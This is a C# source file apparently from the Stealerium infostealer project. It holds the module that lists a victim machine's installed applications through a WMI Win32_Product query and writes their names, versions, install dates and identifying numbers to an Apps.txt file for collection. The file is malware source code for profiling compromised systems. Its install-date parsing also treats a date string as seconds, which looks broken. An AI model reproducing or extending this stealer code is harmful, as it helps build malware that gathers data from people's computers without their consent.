using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class InstalledApps
    {
        // Get installed applications
        public static void WriteAppsList(string sSavePath)
        {
            var apps = new List<App>();
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
                foreach (var o in searcher.Get())
                {
                    var row = (ManagementObject) o;
                    var app = new App();
                    if (row["Name"] != null)
                        app.Name = row["Name"].ToString();
                    if (row["Version"] != null)
                        app.Version = row["Version"].ToString();
                    if (row["InstallDate"] != null)
                    {
                        var seconds = int.Parse(row["InstallDate"].ToString());
                        var time = TimeSpan.FromSeconds(seconds);
                        var dateTime = DateTime.Today.Add(time);
                        app.InstallDate = dateTime.ToString("dd/MM/yyyy HH:mm:ss");
                    }

                    if (row["IdentifyingNumber"] != null)
                        app.IdentifyingNumber = row["IdentifyingNumber"].ToString();

                    apps.Add(app);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("InstalledApps fetch error:\n" + ex);
            }

            //Apps.Sort();
            foreach (var app in apps)
                File.AppendAllText(
                    sSavePath + "\\Apps.txt",
                    $"\nAPP: {app.Name}" +
                    $"\n\tVERSION: {app.Version}" +
                    $"\n\tINSTALL DATE: {app.InstallDate}" +
                    $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
                    "\n\n");
        }

        internal struct App
        {
            public string Name { get; set; }
            public string Version { get; set; }
            public string IdentifyingNumber { get; set; }
            public string InstallDate { get; set; }
        }
    }
}